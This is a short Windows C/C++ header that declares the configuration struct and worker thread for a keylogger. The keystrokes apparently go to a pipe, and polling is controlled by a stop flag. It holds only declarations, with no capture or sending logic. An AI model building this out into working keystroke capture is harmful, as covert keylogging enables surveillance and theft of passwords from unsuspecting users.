#pragma once

#include <windows.h>

struct KeylogConfig {
    HANDLE   pipeWrite;
    volatile LONG active;      // InterlockedExchange for thread-safe stop
    ULONG    pollIntervalMs;   // base polling interval (default 100ms)
};

DWORD WINAPI KeylogWorker(LPVOID lpParam);
